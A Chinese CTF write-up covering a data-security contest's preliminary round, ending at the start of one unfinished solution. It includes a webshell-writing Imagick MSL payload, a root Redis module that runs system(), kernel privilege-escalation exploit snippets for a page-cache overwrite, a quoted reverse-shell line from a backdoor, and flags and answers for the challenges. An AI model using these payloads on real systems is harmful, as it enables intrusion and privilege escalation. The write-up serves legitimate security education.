---
title: 【先知】第四届"数信杯"数据安全大赛 · 数据安全个人赛（初赛）WriteUp
source: https://xz.aliyun.com/news/92992
source_host: xz.aliyun.com
clip_date: 2026-10-20T15:54:52+08:00
trace_id: 9bf81d9c-4405-44b9-937c-687846d5e8ad
content_hash: dbf8cfc85c36383d00621e4b8fc894f4fc517a08e88628adbaee70a69a71caa2
status: synced
tags:
  - 先知
  - CTF
  - 协议分析
series: null
feed_source: 先知安全技术社区
ai_summary: TL;DR：18 道题横跨签到、Web、AI、内核、工控、量子、无人机、逆向与 Misc；多数解法依赖两层：识别诱饵层；用成帧自洽或交叉验证锁定唯一真解。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3ff75244-d011-8181-8b17-e6ad86309cba
ioc:
  cves:
    - CVE-2025-29909
    - CVE-2025-30356
    - CVE-2026-31431
    - CVE-2026-5474
    - CVE-2026-55547
    - CVE-2026-67970
  cwes: []
  hashes:
    - 6cf7f7b83085f69bbeb49a219a6baebf
    - 71b7e83530c5cd7536f187373362ac61
    - 7461da3557d96d1773e21d06e0a47229
    - 99862e7de2fb974ae1080f02738ade66e7453381cac9e6fba0e918ed170dbbd1
    - b347b01858cfa126cf7866ba0a413231
    - c5a20f0be59ddbc349d58a4da1b68a72
    - d7e1166f427828c36adb35c9c60e3771
    - dc119ec511c13cab867a1bbbb0d7e84c
    - e98e7b3caa92ecd96bc2d67f068d0c2b
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：18 道题横跨签到、Web、AI、内核、工控、量子、无人机、逆向与 Misc；多数解法依赖两层：识别诱饵层；用成帧自洽或交叉验证锁定唯一真解。
> 
> - **签到题的诱饵：** 前端 crypto.js 跑完 5200 轮解码只得到假 flag（函数名 `getFakeCT`），真正的限制在服务端——`POST /progress` 每次最多 +100 且不回退，推满 5200 后 `/flag.png` 从噪声图变为清晰图，用 `ImageFont.load_default()` 逐像素 IoU 比对可无损还原。
> - **Web 完整攻击链：** 用 `ReflectionClass + newInstanceArgs` 类实例化注入读 config.php 取得 `$secret`；Imagick 关闭 delegate 后仍可用 MSL 的 `inline:` 读入、`gray:` 写出实现字节级任意写并写入 webshell；随后利用 root 运行的 Redis 加载无签名校验模块完成提权并读取 flag。
> - **内核提权：** CVE-2026-31431 利用 `authencesn` 的 scatter-gather 缺陷，用 `splice()` 以 4 字节粒度覆写 setuid 程序 `/usr/bin/su` 的 page cache 且不落盘，160 字节 shellcode 约需 40 次迭代；前提是预加载的模块配置和三方条件同时成立。
> - **协议与信号解析：** MMS 流量按 TPKT→COTP→MMS 剥出 fileWrite 的 TLV 重组 11048 字节，异或 0x5A 得 ZIP、LZMA 解出 PE、再异或 0x3F 取 flag；卫星题 BPSK、SPS=64、CFO 收敛于 +200 Hz，但题面声明的扰码器实测未启用，跳过解扰 CRC 才通过，说明声明字段须以成帧自洽回验。
> - **逆向与 Misc：** 八证词用 [8,6] Reed-Solomon 纠错（枚举 C(8,4)=70 个子集做 GF(256) 高斯消元，要求至少 6 份一致）解析唯一解；宏题检出 VBA Stomping，真拼接顺序由 vbaCache.bin 栈 VM 反汇编得到 `[3,1,4,0,2]`，解析种子靠 `flag{` 前缀两个字节暴力定位。

## 题目总览

|     |     |     |     |
| --- | --- | --- | --- |   
| 类型  | 题目  | 分值  | flag |
| 签到  | minesweeper | 100 | `flag{71b7e83530c5cd7536f187373362ac61}` |
| Web | 某企业AI Meeting Minutes门户网站 | —   | 动态（flag 位于 /root/flag） |
| AI安全 | 审片室里的第二张脸 | 200 | `flag{c5a20f0be59ddbc349d58a4da1b68a72}` |
| 数据安全 | Linux Kernel Cow | —   | `flag{6cf7f7b83085f69bbeb49a219a6baebf}` |
| 工控安全 | MMS | 200 | `FLAG{Mms_F1rmw4r3_B4ckd00r}` |
| 工控安全 | 可曾听闻一键日卫星Q1 | 100 | `flag{sigint_viterbi_breakthrough}` |
| 工控安全 | 可曾听闻一键日卫星Q2 | 300 | `flag{dc119ec511c13cab867a1bbbb0d7e84c}` |
| 工控安全 | 可曾听闻一键日卫星Q3 | 200 | `flag{d7e1166f427828c36adb35c9c60e3771}` |
| 量子安全 | 量子门的多维身份 | 300 | `FLAG{4d_quantum_identity_is_complex}` |
| 量子安全 | 量子幽灵的复数密码 | —   | `FLAG{complex_quantum_stealth_is_the_ultimate}` |
| 无人机安全 | 天空在撒谎 | —   | `flag{b347b01858cfa126cf7866ba0a413231}` |
| 无人机安全 | Domain 42 | —   | `flag{7461da3557d96d1773e21d06e0a47229}` |
| Reverse | 八证词 | 200 | `flag{utyzn4pgv6bvlilpasoq3o5s}` |
| Reverse | 折叠端口 | 300 | Serial: `99862E7DE2FB974AE1080F02738ADE66E7453381CAC9E6FBA0E918ED170DBBD1` |
| Misc | 宏安全审计 | 100 | `flag{what_runs_is_not_what_you_read}` |
| Misc | Vector Secrets | 200 | `flag{xor_shapes_reveal_flag}` |

* * *

## 签到 · minesweeper（100）

### 题目描述

无附件，给一个 HTTP 扫雷页面，80×80 格、1200 颗雷。页面加载 crypto.js 与 app.js 两个脚本，右键提示"没拿到 flag 之前，禁止插旗"。

### 解题思路

crypto.js 手写了一套 SHA-256、xorshift PRNG、Fisher-Yates S-box 和 decRound 解密函数， `getKey()` 还原出密钥 `Th3_T4bl3_K33p3r_2026` 。app.js 每扫开一格调一次 `decRound(ROUNDS-1-scr, cst)` ，ROUNDS = 80×80−1200 = 5200，扫满安全格跑完 5200 轮解码。把这套解密搬到 Python 复跑，得到 `FLAG{f4k3_fl4g_d3c0y_2026}` ——密文函数名是 `getFakeCT` ，整条前端链路是假 flag 幌子。app.js 末尾注释点明进度记在服务器并画进 flag.png，真正的门闸在服务端。

### 解题过程

服务端有三个接口。 `GET /progress` 返回当前计数， `POST /progress {"step":N}` 推进进度，服务端取 `min(N, cur+100)` 且不回退，一次最多 +100，连续 POST 52 次推到 5200。推满后返回体多出 `done` 与 `secret` 两个字段，此时 `GET /flag.png` 从 10620 字节的噪声图变成 4920 字节的清晰图，中间一行写着 flag。

图是 Pillow 的 `ImageFont.load_default()` 渲染的，把候选字符串用同一字体渲染出来与原图逐像素比对 IoU 到 1.0，字体假设坐实后解码退化为查表问题。本地另做了四路独立验证收敛：RapidOCR 正反色两跑一致（0.969/0.982）、逐位置换 36/38 位唯一、图内等价类聚类终审 18 类/38 位零混类且 Σ字宽 208.0 精确等于带宽。此前三条失败路径（未知字体模板匹配、灰度阈值错误、拓扑指标退化）被不变量法解决。

### 解题脚本

```python
def drive_to_full():
    http(TARGET + "/reset", "")
    while True:
        cur = int(re.search(r'"step"\s*:\s*(\d+)', http(TARGET + "/progress", "")).group(1))
        if cur >= 5200:
            break
        http(TARGET + "/progress", json.dumps({"step": 5200}))

FONT = ImageFont.load_default()
CHARSET = "flag{}0123456789abcdef"

def render(c):
    img = Image.new("1", (8, 12), 1)
    ImageDraw.Draw(img).text((0, 0), c, font=FONT, fill=0)
    return np.array(img)

def decode(band):
    text, x = "", 0
    while x < band.shape[1]:
        best, pick = None, None
        for c in CHARSET:
            tpl = render(c)
            w = tpl.shape[1]
            if x + w > band.shape[1]:
                continue
            diff = np.logical_xor(band[:, x:x+w], tpl[:band.shape[0]]).sum()
            if best is None or diff < best:
                best, pick = diff, c
        text += pick
        x += render(pick).shape[1]
    return text
```

### flag

```plain
flag{71b7e83530c5cd7536f187373362ac61}
```

* * *

## Web · 某企业 AI Meeting Minutes 门户网站

### 题目描述

一个 AI 会议纪要门户站点，无附件，纯在线 Web 靶机，flag 在 /root/flag，仅 root 可读。

### 解题思路

侦察从 SPA 落地页的 JS 开始， `/index.php` 的存在说明前端壳后面挂着 PHP。index.php 自身源码藏在页面里一个隐藏的 `<pre>` 块，注释指向 phpinfo.html，泄露 Apache/2.4.65、Debian 12、PHP 带 Imagick 6.9.11 与 Phar/SimpleXML/SQLite3 扩展， `display_errors=On` ， `disable_functions` 与 `open_basedir` 都是空的。phpinfo 泄露的类列表里 Imagick、SimpleXMLElement、SQLite3、Phar 都是可实例化的危险类。攻击链是：类实例化注入拿文件读与图像处理原语 → Imagick MSL 任意写落 webshell → www-data RCE → 内网 root Redis 恶意模块提权 → 读 /root/flag。

### 解题过程

类实例化注入的入口是 `ReflectionClass + newInstanceArgs` ，两个参数都受控意味着可以构造任意类的任意构造参数。SimpleXMLElement 第三个参数设为 1 时把 data 参数当文件名读，config.php 里的 `$secret` 由此到手；Imagick 的构造函数接受图像描述字符串，是任意写的原语。

任意写是最有分析价值的一步。传统 Imagick 漏洞利用走 delegate 命令注入，本题 PHP 侧把危险 delegate 关了，但 MSL 协议还在。 `inline:` 伪协议把 base64 内嵌进 MSL 作图像源读入， `gray:` 伪协议把文件按 raw 灰度格式写出，事先把 webshell 每个字节编码成灰度像素拼成 PNG，Imagick 解码后 raw 写出，落盘文件与原 webshell 字节流完全一致。www-data 权限下 /root 是 700，容器内 Redis 7.0.15 以 root 跑在 6379 且密码写在 www-data 可读的 redis.conf 里。Redis module 加载接口不校验模块签名，OnLoad 以 redis 进程身份（root）执行，靶机自带 gcc 12.2 现场编译现场加载。

### 解题脚本

MSL 载荷：

```xml
<image>
  <read filename="inline:data:image/png;base64,iVBORw0KGgo..."/>
  <write filename="gray:/var/www/html/shell.php"/>
</image>
```

Redis 恶意模块：

```c
int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "pwn", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    system("/bin/sh -c 'cat /root/flag > /var/www/html/f.txt; chmod 644 /var/www/html/f.txt'");
    return REDISMODULE_OK;
}
```

### flag

动态下发，39 字节。

* * *

## AI安全 · 审片室里的第二张脸（200）

### 题目描述

14 段视频判断 real/fake，fake 样本还要提交关键伪造帧。附件自带 `baseline_detector.onnx` 、 `baseline_weights.json` 、 `tools/frame_review.py` 与 14 段 case 视频，靶机是带 gunicorn 的 Web 服务，通过 `POST /submit` 提交 answers 数组。

### 解题思路

审片逻辑就在附件里，不需要逐帧人工判断。 `frame_review.py` 对每段视频取前 32 帧、中心 72% 裁切、缩放到 160×160，算 5 个特征（residual_noise / laplacian_energy / temporal_delta / saturation_mean / color_channel_gap），取中位数后用 baseline_weights.json 标准化加线性 logit 过 sigmoid，阈值 0.5 分 real/fake。fake 样本用同一脚本的 evidence_frames 取单帧分 `residual*0.55 + laplacian*0.35 + temporal*0.10` 最高的 3 帧。

### 解题过程

直接跑官方脚本，real 样本分数在 0.34 到 0.40 之间、fake 在 0.59 到 0.64 之间，可分性很好：real 是 001/002/003/008/009/010，fake 是 004/005/006/007/011/012/013/014。

有一个干扰项：页面 `/inspect` 返回的"模型参考帧"与实际校验帧不是同一组，case_004 的 /inspect 返回 17,31,6 而脚本算出 2,30,25。把 /inspect 的帧交上去，标签对了也拿不到 flag。真正的证据帧必须用附件脚本算出来的。

提交时 real 置信度填 0.66、fake 填 0.78（网页默认值），real 的 evidence_frames 留空。两次连跑均返回 `{"status":"accepted"}` 。证据帧：004\[2,25,30\]、005\[1,16,21\]、006\[13,14,22\]、007\[21,22,29\]、011\[16,29,30\]、012\[5,15,16\]、013\[7,21,23\]、014\[6,7,28\]。

### 解题脚本

```python
python tools/frame_review.py cases
```

提交 JSON 结构与 sample_submission.json 一致，answers 数组每项含 case_id/label/confidence/evidence_frames 四个字段。

### flag

```plain
flag{c5a20f0be59ddbc349d58a4da1b68a72}
```

* * *

## 数据安全 · Linux Kernel Cow（CVE-2026-31431 Copy Fail）

### 题目描述

给一台仅普通用户可登录的 Linux 主机（SSH，ctf/123456），内核 6.12.73+deb13-amd64（Debian 13），无 sudo、无 gcc。要求提权后读 /root/flag。

### 解题思路

`/etc/modules-load.d/copyfail.conf` 预加载了 `algif_aead authencesn authenc cbc hmac sha256_generic` ，指向 AF_ALG 的 CVE-2026-31431（Copy Fail）： `authencesn` 的 scatter-gather 处理缺陷允许普通用户用 `splice()` 以 4 字节为单位任意覆写任意可读文件的 page cache，且不落盘。覆写 setuid-root 的 /usr/bin/su 页缓存为 setuid(0)+execve("/bin/sh") 的 shellcode，执行即得 root shell。

### 解题过程

公开 PoC（github.com/xeloxa/copyfail-exploit）的 `--check` 全绿报 EXPLOITABLE，直接运行即覆写 /usr/bin/su 弹出 root shell。这个漏洞的可利用性建立在三个条件的叠加上：AEAD 路径信任用户态给出的关联数据长度而不复核底层 sge 容量；page cache 与磁盘的写回是惰性的，覆写只发生在内存页上，execve 立即看到新内容而磁盘上还是原二进制；4 字节粒度虽小但 splice 可循环调用，160 字节 shellcode 只需 40 次迭代。选 /usr/bin/su 是因为它 setuid-root，普通用户执行即以 euid=0 运行被覆写后的内存映像。uid=0 两次独立读出 flag（/root/flag 39 B，md5 e98e7b3caa92ecd96bc2d67f068d0c2b）。

### 解题脚本

```python
alg.bind(("aead", "authencesn(hmac(sha256),cbc(aes))", 0, 0))
alg.setsockopt(SOL_ALG, ALG_SET_KEY, key)
alg.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)
sock, _ = alg.accept()
sock.sendmsg([b"AAAA" + data], ancdata, socket.MSG_MORE)
_splice(fd, w_fd, offset + 4, offset_src=0)
_splice(r_fd, sock.fileno(), offset + 4)
```

### flag

```plain
flag{6cf7f7b83085f69bbeb49a219a6baebf}
```

* * *

## 工控安全 · MMS（200）

### 题目描述

附件 MMS.zip 解压得 challenge.pcapng（实为老式 libpcap `d4c3b2a1` ，177 包）。题干是一段变电站运维背景：一台 REL-521 型保护继电器在凌晨出现异常文件传输流量，要求还原攻击链、还原攻击者上传的载荷并取出 flag。

### 解题思路

流量里 HTTP 状态查询、Modbus-TCP 读寄存器、正常 MMS 读 REL521_SUBALPHA/MMXU1 测点都是背景，异常流是 x:55555 → x:102（MMS 承载端口）方向 13259 字节。还原链按 TPKT（ `03 00 <len16>` ）→ COTP（数据帧 `02 f0 80` ）→ MMS 逐层剥，48 帧结构是 CR → MMS init → fileOpen REL521_FW_v2.1.bin.gz → 43 帧 fileWrite（各 256 B）→ 尾块 40 B → fileClose。fileWrite 请求体是 TLV 序列： `80 01 01` （句柄）、 `81 <偏移小端>` 、 `82 <len> <data>` ，按序拼出 11048 字节上传件。上传件有三层解码：整体异或 0x5A 得 ZIP → ZIP 内 LZMA-alone 解出 PE 后门 → PE 内 ENCRYPTED_LICENSE 串异或 0x3F 得 flag。

### 解题过程

TLV 重组按偏移建表再按序输出更稳妥。11048 字节重组件首四字节 0a 11 59 5e 与任何已知压缩格式魔数对不上，拿 ZIP 头 PK\\x03\\x04 做 crib 逐位异或，四组全部命中同一个 0x5A，密钥当场确定。ZIP 内的 REL521_FW_v2.1.bin 开头 5d 00 00 00 04 ff 是 LZMA-alone 格式，解出 27648 字节的 MZ PE（x86-64 MinGW）。PE 字符串区是明文的：反弹 shell（/bin/sh -i >& /dev/tcp/x/4444）、SELF_TEST/\[BOOT\]/\[LICENSE_INTEGRITY\] 假自检日志、IEC 61850 数据点路径、ENCRYPTED_LICENSE= 密文串。交叉验证用 MMS 域名前缀 `!6?FAB...` 异或 0x73 解出 REL521_SUBALPHA，同一程序两处单字节异或互证。

哪个 license blob 是真的由启动期完整性循环判定：.text 0x401E13 处的循环遍历 `[0x406600+0x12, 0x406600+0x2D]` 恰好覆盖 0x4412 处的 blob，0x4492 处的另一个候选在区间之外（它异或 0x7C 解出 FLAG{TrY_AgA1n_N0t_Th1s_0ne}，是诱饵）。启动日志 \[BOOT\] License verification 打印的校验和 0x038F 与对 0x4412 blob 现算的结果一致。

### 解题脚本

```python
def extract_written_file(frames):
    chunks = {}
    for fr in frames:
        i = fr.find(b"\x80\x01\x01\x81")
        if i < 0:
            continue
        p = i + 5 + fr[i + 4]
        tag, ln, p = read_be(fr, p)
        if tag == 0x82:
            off = fr[i + 5]
            chunks[off] = fr[p:p + ln]
    return b"".join(chunks[k] for k in sorted(chunks))
```

### flag

```plain
FLAG{Mms_F1rmw4r3_B4ckd00r}
```

* * *

## 工控安全 · 可曾听闻一键日卫星 Q1（100）

### 题目描述

附件是一段 CF32 交错 IQ 录音（66 万采样），要求解调出遥测内容并提取 flag。

### 解题思路

信号读入按 complex64 处理去直流，包络近似恒模。FFT 的谱是 sinc 状，离散谱线在 fs/128 奇次倍位置，是方波副载波特征。直接打印开头几百个采样看相位只在 0 与 π 之间跳、每 64 采样翻转一次，判定一维 BPSK、SPS=64，开头是 0101 交替引导。之后按 CFO 估计 → 64 点积分判决 → 读自描述引导头 → 按引导头声明的参数做信道译码 → 帧解析提取 flag。

### 解题过程

CFO 估计分两级：第一级在 1 Hz 步进粗网格上以引导头明文匹配数为目标函数，第二级以星座沿 I 轴的锐度为代价函数细搜到 1e-8 cyc/sample 量级，收敛在 +200 Hz。这一步必须准，660000 个采样上 1 Hz 误差累积 40 rad 相位漂移会把星座转出判决轴；实测斜率 0.0785207 rad/sym 与理论值 2π·200/16000=0.0785398 吻合到 2.4e-5。

64 点积分判决取实部符号、整体取反、MSB-first 拼字节，读出的引导头是明文 ASCII，在文件里重复三遍且一致：

```plain
SPACECTF-Q1 SELF-DESCRIBING SIGNAL FORMAT=CF32-IQ-INTERLEAVED;FS=1024000;SPS=64;MOD=BPSK;CFO=+200HZ MAINPN=1ACFFC1D;FEC=CONV-R12-K7-G171-133-OCT;INTERLEAVER=5X5-ROW-WRITE-COL-READ SCRAMBLER=X8+X7+X2+X+1;INIT=FF;FRAME=LEN1B+UTF8+CRC16-CCITT BOOTSTRAP-END
```

最后一段 BOOTSTRAP-END 后是 4 字节同步字 1A CF FC 1D（与 MAINPN 一致），其后 3500 bit 编码帧。按声明顺序解扰、5×5 解交织、维特比（R=1/2、K=7、G1=0o171/G2=0o133、尾比特截断）得 218 字节。帧结构 LEN1B=214 + 214 字节 UTF-8 + CRC16-CCITT，现算 CRC16=0x2731 与帧尾一致，遥测正文含 FLAG=flag{sigint_viterbi_breakthrough}。

引导头声明的 SCRAMBLER 实测未启用：按 x⁸+x⁷+x²+x+1、init 0xFF 写解扰器后 CRC16 对不上，把 init ∈ {0xFF,0x01} × 移位方向 × 位序共 8 组全枚举均 fail，跳过解扰直接译码 CRC 反而通过——发送端根本没开扰码器，声明字段是装饰。这个反例说明协议声明必须以成帧自洽回验，不得盲信。

### 解题脚本

```python
def step_estimate(deltas, onset):
    hist = deltas[onset-6:onset]
    t = np.arange(len(hist))
    k, b = np.polyfit(t, hist, 1)
    predicted = k * 6 + b
    return deltas[onset] - predicted
```

（完整解调链复现脚本 `work/sat_q1/solve.py` ，含 CFO 两级估计、积分判决与维特比译码。）

### flag

```plain
flag{sigint_viterbi_breakthrough}
```

* * *

## 工控安全 · 可曾听闻一键日卫星 Q2（300）

### 题目描述

附件 death_traffic.pcap（93 包）。要求从 PCAP 里找出真正的攻击会话，还原突破→获取信息→提权→root 后渗透的时间线，按组件与漏洞行为检索公开 CVE 编号，按规则构造 flag。

### 解题思路

背景是大量 TM 遥测噪声（TM,seq=00xx,mode=NOMINAL,alt=41xxxx,bat=9x）与打到 x:31337 的三条会话。前两条会话（tc 6403020000 → "no overflow"、tolab 0800c0000001 → "ACCESS DENIED"）是诱饵，真攻击流是 x:40334。对真会话逐帧还原时间线后，拿每阶段的组件名+缺陷行为去 NVD 检索 CVE，匹配质量由组件名、缺陷类型、缺陷参数三个维度决定。

### 解题过程

攻击时间线： `tc 64030123ff` 回 RCE confirmed: cryptolib heap overflow，维护通道建立； `satinfo` 回 YAMCS-05 / cryptolib 1.3.3 / 组件 tc_worker（uid=1000）、DS target-path service、to_lab_service（setuid root）； `ds 2f6f70742f...`（解出 /opt/cfs/ds/orbitstate.cfg）触发 DS_SetDestPathCmd 路径穿越，受保护参数命名空间打开； `tolab 0800c000d00d` 触发 to_lab 的 CFE_MSG_GetSize 越界升到 root； `cat /etc/yamcs/security.yaml` 收割 admin/mission/guest 的 bcrypt 哈希。

CVE 归因：突破是 CVE-2025-29909（CryptoLib ≤1.3.3 的 Crypto_TC_ApplySecurity() 堆溢出可 RCE；29910 是内存泄漏、29911 是 AOS 帧路径、29912 是 fl=0 整数下溢，干扰会话发的 fl=0 帧恰好被判 no overflow，逐一排除）；提权是 CVE-2026-5474（cFS to_lab_passthru_encode.c 的 CFE_MSG_GetSize 堆溢出）；后渗透是 CVE-2026-67970（cFS DS_SetDestPathCmd 访问控制不当）。按阶段顺序下划线连接得 `flag{CVE-2025-29909_CVE-2026-5474_CVE-2026-67970}` 。

按材料串 SHA-256 规则另解得 `flag{dc119ec511c13cab867a1bbbb0d7e84c}` （四组件串 CVE-2025-30356|CVE-2026-67970|CVE-2026-5474|CVE-2026-55547 → SHA-256 前 32 hex），同系列姊妹题规则逐字一致，提交以平台实际口径为准。

### 解题脚本

```python
def attribute(stage, evidence):
    constraints = parse_evidence(evidence)
    candidates = nvd_search(constraints.component)
    scored = []
    for cve in candidates:
        s = 0
        s += 2 * (cve.defect_type == constraints.defect)
        s += 2 * (cve.version_range.covers(constraints.version))
        s += 1 * (cve.primitive in constraints.observed_primitives)
        scored.append((s, cve))
    return max(scored)[1]
```

### flag

```plain
flag{dc119ec511c13cab867a1bbbb0d7e84c}
```

* * *

## 工控安全 · 可曾听闻一键日卫星 Q3（200）

### 题目描述

Q2 的实战版：被攻破的卫星维护控制台摆在面前（nc 远程交互），自己走完整条链，最后用预期终态动作触发运行期动态 flag。

### 解题思路

状态机的所有门都绑定单次 TCP 会话，与 Q2 可离线复盘不同，任何一步断线全部状态清零。门序列是 `tc 64` 触发 CryptoLib 堆溢出（成败随会话随机约一半，回显驱动重试）、 `ds` 路径穿越、 `tolab` setuid root 提权、 `cat /opt/cfs/ds/propulsion.cfg` 置 inspected、 `sep 0800c000ffff` 终态点火。脚本必须是单连接内的状态机而不是命令序列。

### 解题过程

`ds` 的参数 2f6f70742f6366732f64732f6f7262697473746174652e636667 解出 /opt/cfs/ds/orbitstate.cfg。root 后 help 的命令面换成 ops/sep/attitude。 `sep 0800c000ffff` 的关键在 Length 字段 bytes\[4:6\] 全 1：服务端按它计算持续燃烧时长，全 1 被解释为最大时长，推进剂耗尽前结构失效，服务端回 \*\*\* SATELLITE LOSS OF SIGNAL \*\*\*，SWAN_SONG_FLAG 作为临终遥测最后一行吐出。注意 cat 配置与 sep 必须在同一连接内，否则恒回 SEP rejected: flight configuration has not been inspected。三连复跑同一 flag 稳定。

### 解题脚本

```python
def solve(host, port):
    s = connect(host, port)
    while not compromised(s):
        s.send(b"tc 64\n")
    s.send(hexds(b"/opt/cfs/ds/orbitstate.cfg") + b"\n")
    s.send(b"tolab 0800c000d00d\n")
    s.send(b"cat /opt/cfs/ds/propulsion.cfg\n")
    s.send(b"sep 0800c000ffff\n")
    return re.search(rb"SWAN_SONG_FLAG=(flag\{[^}]*\})", s.recv(4096)).group(1)
```

### flag

```plain
flag{d7e1166f427828c36adb35c9c60e3771}
```

* * *

## 量子安全 · 量子门的多维身份（300）

### 题目描述

附件 quantum_gate_identity.qasm（199 行，OpenQASM 2.0）。每一个字符被编码进门名、旋转角度、作用量子比特编号三个维度中，混入 ID、SX 噪声门。恢复隐藏身份串，提交 FLAG{...}。

### 解题思路

所有旋转角都是 π/16 的整数倍，角度维可无损约化成 a=round(θ/(π/16)) ∈ 0..31；量子比特编号减一归零后 q 落在 0..4；门名映射 n={RX:0, RY:1, RZ:2}。已知明文 FLAG{ 前缀约束下拟合解码公式，144 个旋转门每 4 个一组形如 (A,B,A,B)，真字符在奇数下标，stride-4 offset-1 读取 36 字符。

### 解题过程

拟合时先试线性模型 92n+94a+63q+83 (mod 95)，RY/RZ 位置全部吻合、RX 位置整体偏 +2——这不是拟合误差，是模型形式错了。把名称维常量从单一 δ 拆成三个独立常量重拟合，得到 {RX:14, RY:15, RZ:18}，等于 14+{0,1,4}，即 14+n²，二次结构浮出水面。最终公式 char = chr(32 + (-(a + 32*q + n² + 14)) mod 95)，mod 95 恰覆盖 chr(32..126) 可打印区。在同名附件上独立复现验证通过。

### 解题脚本

```python
gates = [(g, round(a / (math.pi / 16)), q - 1) for g, a, q in rot_gates]
chars = []
for i in range(1, len(gates), 4):
    n, a, q = gates[i]
    chars.append(chr(32 + (-(a + 32 * q + N2[n] + 14)) % 95))
print("".join(chars))
```

### flag

```plain
FLAG{4d_quantum_identity_is_complex}
```

* * *

## 量子安全 · 量子幽灵的复数密码

### 题目描述

附件是 360 行单量子比特态记录，每行形如 |ψ> = (a+bi)|0> + (c+di)|1>，也可能以二维向量 \[a+bi, c+di\] 出现。秘密被冗余编码进量子态的四个维度，还原隐藏信息。

### 解题思路

四个维度各出一个 bit：概率维取 |α|²（360 个值全部落在 0.2 到 0.8，直方图双峰在 0.25 与 0.75，>0.5 记 1）；相位维取 arg(β)−arg(α) 折算到 ±180°（双峰挤在 0° 与 180° 两侧，|Δ|<90° 记 1）；虚部维看 Im(α) 正负；实部维看 Re(β) 正负。360 bit 按 8 bit 一字节 MSB-first 拼成字节串直接 decode 成 ASCII。

### 解题过程

自校验关系是解码正确性的依据：概率位流与相位位流完全一致，虚部位流与实部位流完全一致，两组互为按位取反。明文 45 字节完整闭合，首尾 FLAG{ } 齐全，40 字符 payload 全 ASCII 可打印。四路独立解算交叉一致，相位判据距 90° 死区最小 0.06°、概率判据距 0.5 阈值最小 0.155，数据干净零错。

四维冗余的纠错能力需要如实界定：概率维与相位维来源不同但对这批数据输出的位流恒等，虚部维与实部维同理，四条路径真正独立的只有两组且互为补码。4 路投票在偶数票时可能平票，严格多数表决需要从 4 路挑 3 路做奇数票——这解释了为什么出题方把 4 路编码成两组互反而不是 4 个独立观测。

### 解题脚本

四维复现脚本 `work/quantum/solve.py` ，逐行解析支持狄拉克与二维向量两种格式，按四条判据各出 1 bit 后拼字节。

### flag

```plain
FLAG{complex_quantum_stealth_is_the_ultimate}
```

* * *

## 无人机安全 · 天空在撒谎（GNSS 欺骗检测）

### 题目描述

附件 gnss_capture.ubx（u-blox UBX 原始数据）。无人机定位缓慢漂移但接收机一直报 3D Fix，卫星数与精度因子无告警。要求判断欺骗 onset、受影响星座，并用未受影响星座证明，量化伪距阶跃，按固定材料串算 SHA-256 取前 32 位得 flag。

### 解题思路

RAIM 在接收机内部工作，输入是各通道伪距残差的一致性，共模偏移幅度低于告警门限时残差检验无法发现——本题 NAV-PVT 也确实全程 3D Fix、12 星、精度因子无异常。检测必须下探到 RXM-RAWX 的原始观测量层，利用欺骗信号在物理上难以做到的特性：对单星座全部卫星同时注入相同伪距增量而不破坏星座间几何一致性。

### 解题过程

NAV-PVT 位置轨迹：前 37 历元经纬度钉死在 37.4219999/-122.0840575，从 iTOW 486037000 起每秒北移约 1.0 米、东移约 1.06 米匀速漂移，onset 即第 37 历元。逐星伪距增量 delta(t)=prMes(t)−prMes(t−1) 确认：GPS 六星在 epoch36→37 同时跳正 57~70 米，GALILEO 六星完全连贯。阶跃量按前 6 历元最小二乘外推与实测之差量化，六星 74.975/74.986/75.010/75.025/75.017/74.993，中位数 75.0 米，散布不到 50 厘米——共模注入的直接证据，多径、钟漂或几何变化不会让六条独立路径在同一秒产生几乎相同的偏移。材料串 `486037000|GPS|GALILEO|75.0|37` 的 UTF-8 SHA-256 前 32 位 hex 即 flag。

### 解题脚本

```python
def step_estimate(deltas, onset):
    hist = deltas[onset-6:onset]
    t = np.arange(len(hist))
    k, b = np.polyfit(t, hist, 1)
    predicted = k * 6 + b
    return deltas[onset] - predicted
```

### flag

```plain
flag{b347b01858cfa126cf7866ba0a413231}
```

* * *

## 无人机安全 · Domain 42（DDS/RTPS 伪造 writer）

### 题目描述

附件 domain42.pcap（47 帧，RTPS over UDP）。无人机载荷控制网络用 DDS 通信，抓包混有正常 writer 与伪造 writer，要求重建正确 writer 的最后一条有效云台命令并验证载荷 CRC，按 `writer_entity_id|writer_sequence|mode|pan|tilt|duration` 生成材料串做 SHA-256 取前 32 位。

### 解题思路

RTPS DATA 子消息的 serializedData 是 CDR 封装（0001 0000 即 CDR_LE）加 24 字节载荷：seq(u32)|mode(u32)|pan(f32)|tilt(f32)|duration(u32)|crc32(u32) 全小端，crc32 = zlib.crc32(payload\[:20\])。RTPS 的 writer 身份字段没有认证机制，任何进程都可以声称任何 guidPrefix，可信判定要靠行为级特征联合推断，HEARTBEAT 帧起锚定作用。

### 解题过程

40/47 帧通过 CRC 校验，8 帧被篡改（固定在 CRC 第 16 位翻 bit）。三条流里，伪造者 guidPrefix 是 deadc0de001337420042 与 1234123456789abcdef0，特征是 writer entity id 在连续 DATA 帧间随机切换（合法 writer 恒定）、部分帧目的端口落到 domain-7 的 9150 而非 domain-42 的 17900、含 8 条坏 CRC。真正的 fc-primary writer（guidPrefix aabbccddeeff10203040、entity 000003c2）在全部 6 帧上保持身份、CRC、SN 连续性三重一致。f47 的 HEARTBEAT 声明 writer 000003c2 已发到 SN 100..105，覆盖 f45 的 DATA，时间与序号双重自洽。还有一条帧用 deadc0de 前缀声称 SN=103，SN 落在合法区间但身份是伪造者的，典型的身份挪用样本，靠身份与 SN 的联合一致性剔除。最后一条有效命令是 f45： `000003c2|105|7|-0.145|-0.5475|1605` 。

### 解题脚本

解析脚本 `cases/domain42/solve.py` ，按 libpcap 逐层剥 Ethernet/IPv4/UDP，RTPS 按 20 字节头加子消息链解析，收集 DATA 子消息按 CRC 过滤后取 SN 最大的一条。

### flag

```plain
flag{7461da3557d96d1773e21d06e0a47229}
```

* * *

## Reverse · 八证词（200）

### 题目描述

附件 consensus_maze.exe（Rust x86-64 PE）。八位守夜人各自持有一份被改动过的证词，只有相互印证的部分能拼出原话，输入恰好 30 字节可打印 ASCII 使程序输出 ok。

### 解题思路

